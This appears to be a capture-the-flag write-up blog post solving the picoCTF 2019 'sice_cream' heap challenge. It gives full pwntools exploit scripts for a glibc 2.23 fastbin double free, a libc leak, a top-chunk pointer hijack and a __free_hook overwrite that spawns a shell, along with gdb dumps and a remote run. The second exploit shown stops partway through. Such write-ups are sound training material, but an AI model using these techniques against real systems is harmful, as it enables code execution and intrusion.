---
layout: post
title:  "picoCTF 2019: sice_cream (Glibc-2.23 Heap Exploitation)"
date:   2019-10-12 00:00:02 +0800
categories: pwn
tags: picoCTF-2019
---

The solution that I came up with (including some help :P) for this challenge is absolutely mind blowing. I'm still not sure if it's the intended solution.

There is also what I think is the official solution (`NotDeGhost` from redpwn told me about it after I solved it), so I will showcase that at the end of this writeup as well.

I usually put a TL;DR here, but no TL;DR will sufficiently show how amazing this challenge is. Huge props to the author `poortho`.

### **Challenge**

* **Category:** pwn
* **Points:** 500
* **Solves:** 14

>Just pwn this [program](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream) and get a flag. Connect with `nc 2019shell1.picoctf.com` 6552 . [libc.so.6](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/libc.so.6) [ld-2.23.so](https://2019shell1.picoctf.com/static/b53566a7a55dd9ef5954e859d56c143d/sice_cream)

### **Solution**

Disclaimer: I won't cover the basics of heap exploitation in this post. I have one post relating to a very easy glibc 2.23 heap exploitation challenge ([BSides Delhi 2019: message_saver](/2019-09-30-bsides-delhi-message-saver/)), and another going much more in-depth with regards to how `malloc` and `free` kind of function, as well as what chunks and bins are ([picoCTF 2019: Ghost_Diary](/2019-10-12-picoctf-2019-ghostdiary/)). If the terminology is unfamiliar to you, I suggest going through those writeups.

#### Reverse Engineering the binary

The binary is pretty easy to reverse, so I will not go into details as to how I did it. I had to use `patchelf` initially to change which linker it was using, but other than that, here are its characteristics:
```sh
vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ file sice_cream
sice_cream: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=4112386366befae2dee50fe8ed7c013a8241c69c, stripped

vagrant@ubuntu-xenial:/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream$ checksec sice_cream
[*] '/ctf/pwn-and-re-challenges/picoctf-2019/sice_cream/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
```

The program allows us to do the following:

* All user input in the program is done through the `read` function.

* At the beginning of the program, we are allowed to input 0x100 bytes for our name. This name variable is stored in the .bss segment, and since PIE is disabled, it is stored at the known address 0x602040.

* We are allowed to allocate chunks of size <= 0x58. This is essentially what made this challenge so difficult. I will explain a bit more about that below. We are also only allowed to allocate 19 chunks total. There is no way to bring that limit down. Of course we find a way to do it anyway ;)

* Each allocated chunk is stored in a global array of pointers. This pointer is also at a known address right after the name variable. We can free these pointers, and the pointers themselves are not set to NULL after each free, thus allowing us to do double frees.

* We can "reintroduce" ourselves, and change our name. This functionality, as you will soon see, is a godsend for this challenge. It will read in 0x100 bytes again, then it print out our new name. This is the only form of a "leak" we have, so we have to use this to our advantage.

Let's get onto exploiting now.

#### Step 1: **Unsorted bin leak**

As usual with heap challenges, we must first start out by getting a libc leak. I first added the application logic functions and some helper functions at the top:
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])
```

The way I got the libc leak was to do the following steps:

1. At the beginning of the program, make our name look like a fake chunk of 0x61 size.

1. Allocate three chunks of size 0x58.

2. Double free one of them (`free(0)` -> `free(1)` -> `free(1)`).

3. Reallocate a chunk of size 0x58, then set its first 8 bytes (the fd pointer) to our name variable.

4. Three more allocations later, and we get a chunk right on top of our name variable

5. Now we reintroduce ourselves again and make the chunk header a size of 0x91 and create a bunch of fake chunks

6. Free the chunk, and it places the address of `main_arena + 0x58` into the `fd` and `bk` fields of our "fake" chunk

7. Leak it by reintroducing ourselves and typing in enough characters

```python
'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more allocations, chunk 6 will be at our name variable
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr+0x58>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
```

#### Step 2: **Overwrite __free_hook, but HOW?**

Here is where the exploit gets very interesting. Here is what I tried initially:

1. I tried your standard fastbin attack to get a chunk above `__malloc_hook`, but quickly realized that due to the 0x58 size constraint, this was not possible. We'd need to be able to allocate chunks of size 0x60-0x68 to be able to do this attack (FAILED).

2. Then, I tried to overwrite `_IO_2_1_stdin_`'s `_IO_BUF_END` to the address of `main_arena + 0x58` by doing the unsorted bin attack. The idea was that after doing this, any user input performed using `scanf` would use the space between `_IO_BUF_BASE` and `_IO_BUF_END` to store our input. We could overwrite `__malloc_hook` this way, since `_IO_BUF_BASE` is set to right above `__malloc_hook`, and `main_arena + 0x58` is way after `__malloc_hook`. However, of course the program only uses `read` to read in user input and not `scanf`, therefore this didn't work either (FAILED).

3. Then, I tried to do the House of Orange attack. However, I've actually never done that attack before, and from my limited knowledge of it, it seemed like the 0x58 size constraint prevented me from doing that attack as well (FAILED).

I spent about a day and a half doing all of that, and kept trying to look for similar writeups. I was then told by NotDeGhost from redpwn that the author `poortho` had made a similar challenge in the past. A little bit of doxxing and I found this one writeup of `hard_heap` from HSCTF-6, which had a broken link, but I could go on the author's github and download the `index.html` file that was used for the writeup and then view it in Firefox.

This person did this brilliant attack where they overwrote the top chunk pointer in the `main_arena` to `__malloc_hook - 0x15`. What happens then is that any request for memory that has to be serviced using the top chunk will give a chunk at `__malloc_hook - 0x15`, which can be used to overwrite `__malloc_hook`.

The only constraint here is that the address we overwrite the top chunk pointer with must have chunk metadata right above it that makes it look like the top chunk. If you are unsure what that looks like, you may view my writeup of [message_saver](/2019-09-30-bsides-delhi-message-saver/) to see how it looks like in memory.
```c
struct malloc_state
{
  /* Serialize access.  */
  mutex_t mutex;

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top; <-.
  //  We overwrite this pointer to change the location of the top chunk in memory

	...
```

Of course when I tried to do the same thing, none of the one gadgets worked. It would be a bad challenge if it was exactly the same as his previous challenge right? So I had to come up with something else. NotDeGhost had also told me that it was possible to overwrite `__free_hook` somehow, and after a while, this is the solution I came up with:

First, using the leaked `__free_hook` address, I tried to see if there was a place above `__free_hook` where I could point the top chunk pointer to. After a bunch of trial and error, I found this:
```c
// __free_hook = 0x7f7b4adaa7a8
gef➤  x/20gx 0x7f7b4adaa7a8 - 0x1100 + 0x70 - 0x5 - 0x10
0x7f7b4ada9703 <stderr+3>:      0xda962000007f7b4a      0xda88e000007f7b4a <--.
0x7f7b4ada9713 <stdin+3>:       0xa04b7000007f7b4a      0x00000000007f7b4a    |
0x7f7b4ada9723: 0x0000000000000000      0x0000000000000000      looks like top chunk header
0x7f7b4ada9733: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9743: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9753: 0x0000000000000000      0x0000000000000000   
0x7f7b4ada9763: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9773: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9783: 0x0000000000000000      0x0000000000000000
0x7f7b4ada9793: 0x0000000000000000      0x0000000000000000
```

At `__free_hook - 0x1100 + 0x70 - 0x5`, we have a valid location to overwrite the top chunk pointer with. The idea for me here was that I would change the top chunk's location in memory to here, and then allocate enough chunks to the point where I get a chunk right on top of `__free_hook`, and then overwrite it with the address of `system`.

After that, if I call `free(chunkptr)`, it will actually call `((*)__free_hook)(chunkptr, ...)`, which gets converted to `system(chunkptr)`. If the first 8 bytes of `chunkptr` in our example happen to be `/bin/sh\x00`, it will call `system("/bin/sh\x00")`. Just what we need.
```c
void
__libc_free (void *mem) // mem is the pointer to the chunk we free
{
  mstate ar_ptr;
  mchunkptr p;                          /* chunk corresponding to mem */

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0)); // <- we can overwrite hook to point to system
      return;
    }
```

#### So how do we do it?

First step is to empty out the unsorted bin. This is because the fake chunk that we have on the name variable is very important for this exploit. We'll be modifying it numerous times, which is guaranteed to corrupt the unsorted bin, therefore we empty it now to prevent the program from trying to get any chunks out of a corrupted unsorted bin.

I do this by first changing its size to 0x61, then allocating a 0x58 sized chunk.
```python
# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7
```

Next, I fake a 0x20 sized chunk and free it. This will fill up the 0x20 sized fastbin in `main_arena`. Since this fake chunk has an address starting with 0x60 (due to our name array being at the address 0x602040), we can get a fake chunk right inside `main_arena`.

I also fake a 0x61 sized chunk and free that in preparation for the fastbin attack that we will do to get the chunk in `main_arena`. Notice how useful this name variable is being?
```python
# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Now we free a 0x61 sized chunk to prepare for the fastbin attack
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6
```
```c
// main_arena = 0x7f19ee5d4b20
gef➤  x/12gx 0x7f19ee5d4b20          .--------------------- Our freed 0x20 chunk
0x7f19ee5d4b20: 0x0000000000000000   |  0x0000000000000000
0x7f19ee5d4b30: 0x0000000000602040 <-   0x0000000000000000
0x7f19ee5d4b40: 0x0000000000000000      0x0000000000602040 <-.
0x7f19ee5d4b50: 0x0000000000000000      0x0000000000000000 Freed 0x60 chunk in preparation
0x7f19ee5d4b60: 0x0000000000000000      0x0000000000000000 for the fastbin attack
0x7f19ee5d4b70: 0x0000000000000000      0x00000000011e3120
gef➤  x/12gx 0x7f19ee5d4b20 + 0x10 - 0x6
0x7f19ee5d4b2a: 0x2040000000000000      0x0000000000000060 <- looks like a fake chunk
0x7f19ee5d4b3a: 0x0000000000000000      0x2040000000000000
0x7f19ee5d4b4a: 0x0000000000000060      0x0000000000000000
0x7f19ee5d4b5a: 0x0000000000000000      0x0000000000000000
0x7f19ee5d4b6a: 0x0000000000000000      0x3120000000000000
0x7f19ee5d4b7a: 0x000000000000011e      0x4b78000000000000
```

Next, we simply do the fastbin attack again to get a chunk in `main_arena`. Using gdb, the offset can be found by trial and error, and then you can overwrite the top chunk pointer to `__free_hook - 0x1100 + 0x70 - 0x5`. Ensure to not put anything but NULL bytes inside `main_arena` before the top chunk pointer. Any other bytes will be treated as an address existing in a fastbin, which corrupts the fastbin and will for sure later crash your program.
```python
# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(free_hook - 0x1100 + 0x70 - 0x5)) # 9

# Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
add(0x58, 'A'*8) # 10
```
```c
// __free_hook = 0x7fb3d8f0a7a8
gef➤  x/10gx 0x7fb3d8f0a7a8 - 0x1100 + 0x70 - 0x5 - 0x10
0x7fb3d8f09703 <stderr+3>:      0xf0962000007fb3d8      0xf088e000007fb3d8 <-.
0x7fb3d8f09713 <stdin+3>:       0xb64b7000007fb3d8      0x0000000000000061   |
0x7fb3d8f09723: 0x4141414141414141      0x0000000000000000   ^   looks like top chunk
0x7fb3d8f09733: 0x0000000000000000      0x0000000000000000   |
0x7fb3d8f09743: 0x0000000000000000      0x0000000000000000 theres our new chunk header
```

Now we take a quick detour. I realized that the number of chunks we'd need to allocate was way over 19, which is what the program limits us to. However, I realized it was very easy to forge a fake chunk right above the global array of chunks, and then get a chunk there using a fastbin attack in order to overwrite a bunch of indexes of that array with NULL. Having PIE disabled makes this very easy.
```python
# Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array

# Address of the fake chunk above the array
fake_chunk_above_array = 0x602130

# Change the name so that it places a fake chunk header right at that address from above
reintroduce(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))

# Free the fake_chunk at the name
free(6)

# Overwrite its fd with the address of our fake chunk above the global array
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

# Chunk 12 will be above the global array, zero out a bunch of indexes
add(0x58, 'A'*0x58) # 11
add(0x58, p64(0)*11) # 12, Free up indexes 0-10

# Now there is a reference to fake_chunk (at our name variable) at idx 11
# This can easily be verified by viewing the array in gdb
```
```c
gef➤  x/100gx 0x602040
0x602040:       0x0000000000000000      0x0000000000000061 <- name variable
0x602050:       0x4141414141414141      0x4141414141414141
...
0x602090:       0x4141414141414141      0x4141414141414141
0x6020a0:       0x4141414141414141      0x0000000000000021 <- fake chunk allows us to free
0x6020b0:       0x0000000000000000      0x0000000000000000
...
0x602120:       0x0000000000000000      0x0000000000000000
0x602130:       0x0000000000000000      0x0000000000000061 <- chunk above global array
0x602140:       0x0000000000000000      0x0000000000000000 <- global array
0x602150:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602160:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602170:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602180:       0x0000000000000000      0x0000000000000000 <- We made NULL
0x602190:       0x0000000000000000      0x0000000000602050 <- idx 11
0x6021a0:       0x0000000000602140      0x0000000000000000
...
```

The next part was a bit of trial and error. I found out that I would need to do 51 allocations of size 0x48 to get right above `__free_hook`. The 52nd allocation of size 0x48 can be used to overwrite `__free_hook` to the address of `system`.

Each time I allocate a new chunk, I also immediately zero out the first 11 indexes of the global array. Of course this is overkill, but I was being lazy.
```python
# Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb

# Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
for i in range(51):
    # Allocate using top chunk
    add(0x48, '\x00'*0x48)

    # Redo the fastbin attack to get a chunk above the global array

    # Free our fake_chunk on the name
    free(11)

    # Change fd to point to fake_chunk_above_array
    reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

    # Two more allocations, zero out the indexes
    add(0x58, 'A'*0x58)
    add(0x58, p64(0)*11)

# After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
add(0x48, '\x00'*0x35 + p64(system))
```

After this, I simply reset the name variable's first 8 bytes to `'/bin/sh\x00'`, and then freed it. This calls `system("/bin/sh\x00")`, as explained above.
```python
# Then just put '/bin/sh\x00' into our name array
reintroduce(p64(0) + p64(0x61) + '/bin/sh\x00')

# Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
free(11)

p.interactive()
```

#### So what is the other solution?

The other solution is based upon the fact that when you double free a chunk and cause a `double free or corruption (fasttop)` error, it will actually call `malloc` internally. I found out about this from [this blog post](https://blog.osiris.cyber.nyu.edu/2017/09/30/csaw-ctf-2017-auir/).

If you cause a double free, the subsequent call to `malloc` actually meets one of our one gadget's constraints, and thus the solution is then much easier: overwrite the top chunk pointer to `__malloc_hook - 0x15` and then overwrite `__malloc_hook` with the working one gadget and cause a double free to get shell.

The exploit for that is showcased at the very end of this post.

### **Final Exploit**

If you want to run this exploit remotely, you should move it to the shell server first. The 51 allocations don't play well unless your internet is extremely fast, unlike mine ^_^
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more frees, chunk 6 will be at name
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))

'''
This next step is just crazy. I had no idea how to go about getting a chunk on malloc_hook
due to the 0x58 allocation size constraint. Getting a chunk on __free_hook was out of the
question. I spent about a day trying to do a version of the House of Orange from HITCON
CTF 2016, but failed to do so due to the size constraints again.

The next day, NotDeGhost from redpwn hinted me towards the fact that poortho (the author of
this challenge) had created a similar challenge before, so I looked him up and found a
couple writeups of his challenge hard_heap from HSCTF-6.

Basically, in the main arena of libc, there is a pointer known as the top pointer that
exists right after the fastbins. This pointer essentially points to the memory address
that gets used whenever the top chunk is used to service allocations. If we can change
this top pointer and have it point to some other memory region, any allocations that
need to use the top chunk will now give us allocations at that memory address.

The only restriction is that this new memory address must look similar to what the top chunk
header looks like.

I first tried to get a chunk on malloc_hook, however none of the one_gadgets worked, so I
had to come up with something else.

NotDeGhost again told me that it is possible to get a chunk on free_hook, and I was
dumbstruck. Took me a while but I realized how to do it.

The solution will amaze you for sure.
'''

# We don't want subsequent allocations to come out of the unsorted bin
# Since we will use our fake chunk a lot, it is guaranteed to be corrupted.
# Any subsequent mallocs will then just crash if the unsorted bin is used
# Therefore, just empty out the unsorted bin here by first changing its size to 0x61
# Then we allocate a 0x58 sized chunk
reintroduce(p64(0) + p64(0x61) + p64(leak) + p64(leak) + p64(0)*9 + p64(0x21))
add(0x58, 'A'*0x58) # 7

# We fake a 0x20 sized chunk and free it. This will be our fake chunk in main_arena.
# The main arena's fastbin[2], which is the 0x20 fastbin, will have a pointer to this chunk.
# Remember this chunk is in the .bss segment, so its address is 0x602040.
reintroduce(p64(0) + p64(0x31) + p64(0x21)*8)
free(6)

# Now we free a 0x61 sized chunk to prepare for the fastbin attack
reintroduce(p64(0) + p64(0x61) + p64(0x21)*18)
free(6)

# This is the address where the 0x602040 address from above looks 16 byte aligned
fake_chunk_top = main_arena + 0x10 - 0x6

# We set our fake chunk's fd pointer to point to our fake chunk in main arena
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_top) + p64(0))

# Chunk 9 will be in main arena, we overwrite it with free_hook-0x1100+0x70-0x5
# If you look at that address-0x10, it looks like the top chunk header
# So we set the top chunk pointer to that address (free_hook-0x1100+0x70-0x5)
add(0x50, 'B'*0x50) # 8
add(0x50, '\x00'*0x3e + p64(free_hook - 0x1100 + 0x70 - 0x5)) # 9

# Now the next chunk was a test to see if it worked
# This chunk should be placed at free_hook-0x1100+0x70-0x5
add(0x58, 'A'*8) # 10

# Next, my plan was to do enough mallocs so we can reach free_hook from free_hook-0x1100 ...
# The program however has a limit of 19 chunks
# I bypass it by getting a chunk right above the global array of chunks
# I then zero out the first 11 indexes of that array

# Address of the fake chunk above the array
fake_chunk_above_array = 0x602130

# Change the name so that it places a fake chunk header right at that address from above
reintroduce(p64(0) + p64(0x61) + p64(0)*11 + p64(0x21) + p64(0)*17 + p64(0x61))

# Free the fake_chunk at the name
free(6)

# Overwrite its fd with the address of our fake chunk above the global array
reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

# Chunk 12 will be above the global array, zero out a bunch of indexes
add(0x58, 'A'*0x58) # 11
add(0x58, p64(0)*11) # 12, Free up indexes 0-10

# Now there is a reference to fake_chunk (at our name) at idx 11
# This can easily be verified by viewing the array in gdb

# Now, this was a bit of trial and error, but I found out that 51 allocations of size 0x48
# was enough to reach just above __free_hook
# Each time we allocate, we zero out the global array immediately
for i in range(51):
    # Allocate using top chunk
    add(0x48, '\x00'*0x48)

    # Redo the fastbin attack to get a chunk above the global array

    # Free our fake_chunk on the name
    free(11)

    # Change fd to point to fake_chunk_above_array
    reintroduce(p64(0) + p64(0x61) + p64(fake_chunk_above_array))

    # Two more allocations, zero out the indexes
    add(0x58, 'A'*0x58)
    add(0x58, p64(0)*11)

# After 51 allocations, we can overwrite __free_hook with system
# We have to keep null bytes before it, otherwise the program will crash (I don't know why)
add(0x48, '\x00'*0x35 + p64(system))

# Then just put '/bin/sh\x00' into our name array
reintroduce(p64(0) + p64(0x61) + '/bin/sh\x00')

# Call free(fake_chunk), which calls system(fake_chunk), which calls system('/bin/sh\x00')
free(11)

p.interactive()
```
```sh
redacted@pico-2019-shell1:~$ python2 exploit.py REMOTE
[*] '/home/warlock/sice_cream'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  './'
[*] '/home/warlock/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 2019shell1.picoctf.com on port 38495: Done
[*] Leak: 0x7f1df256eb78
[*] main arena: 0x7f1df256eb20
[*] Libc base: 0x7f1df21aa000
[*] system: 0x7f1df21ef390
[*] __free_hook: 0x7f1df25707a8
[*] Switching to interactive mode
$ ls
flag.txt
ld-2.23.so
libc.so.6
sice_cream
xinet_startup.sh
$ cat flag.txt
flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_ac8fd349}$
```

### **Other Exploit**

This one can actually be ran on a local machine since it doesn't take nearly as long ^_^
```python
#!/usr/bin/env python2

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

BINARY = './sice_cream'
HOST, PORT = '2019shell1.picoctf.com', 38495

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def debug(breakpoints):
    script = ""
    for bp in breakpoints:
        script += "b *0x%x\n"%(bp)
    gdb.attach(p,gdbscript=script)

# Application logic

def initialize(name):
    p.sendlineafter('> ', name)

def add(size, content):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', content)

def free(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def reintroduce(name):
    p.sendlineafter('> ', '3')
    p.sendafter('> ', name)
    return p.recvuntil('1.')

def start():
    if not args.REMOTE:
        return process(BINARY)
    else:
        return remote(HOST, PORT)

p = start()
if not args.REMOTE and args.GDB:
    debug([])

'''
For step 1, we want a libc leak. PIE is disabled, and the only leak we have is when we
"reintroduce" ourselves, and the program tells us what our name is.

Knowing this, the easiest way to get a libc leak is to first get a fake chunk on top of
the name variable by doing a fastbin attack. Then, we simply change the name to make it
appear to be a chunk of size 0x91, then free it. This causes the addr of main_arena+0x58
to be placed in the fd and bk fields of our fake chunk. The fd and bk fields are
essentially name[2] and name[3] respectively, if each index is considered 8 bytes long
'''

# Initialize our name to look like a fake chunk header with size 0x61
initialize(p64(0) + p64(0x61) + p64(0))

# Address of name global variable (PIE is disabled)
fake_chunk = 0x602040

# Quick double free fast bin attack to get a chunk on top of name
# Allocate three chunks for setup (third chunk might not be needed)
add(0x58, 'A'*0x58) # 0
add(0x58, 'B'*0x58) # 1
add(0x58, 'C'*0x58) # 2

# Double free chunk 0
free(0)
free(1)
free(0)

# Get chunk 0 back, and overwrite it's FD with fake chunk
add(0x58, p64(fake_chunk) + 'A'*0x50) # 3

# Three more frees, chunk 6 will be at name
add(0x58, 'B'*0x58) # 4
add(0x58, 'A'*0x58) # 5
add(0x58, 'C'*0x58) # 6

# Next, we change name so that it looks like a fake chunk with size 0x91
# We also construct a bunch of fake chunks.
# Only two fake chunks are required, I just made a bunch of them cuz I was lazy
# The two fake chunks allow us to free this 0x91 sized chunk and bypass security checks
reintroduce(p64(0) + p64(0x91) + p64(0x21)*23)

# Free fake chunk, places the address of main_arena+0x58 into its fd and bk fields
free(6)

# We overwrite the chunk header with 'AAAAAAA\n'
# This causes reintroduce to say our name, and print out 'AAAAAAA\n<main_arena_addr>'
# We just format it correctly to get the leak
leak = u64(reintroduce('A'*(0x8+0x7) + '\n').split('\n')[1][:-1].ljust(8, '\x00'))

# Calculate all offsets needed
main_arena = leak - 0x58
libc.address = leak - 0x3c4b78
system = libc.symbols['system']
free_hook = libc.symbols['__free_hook']
malloc_hook = libc.symbols['__malloc_hook']
one_gadget = libc.address + 0xf02a4

log.info('Leak: ' + hex(leak))
log.info('main arena: ' + hex(main_arena))
log.info('Libc base: ' + hex(libc.address))
log.info('system: ' + hex(system))
log.info('__free_hook: ' + hex(free_hook))
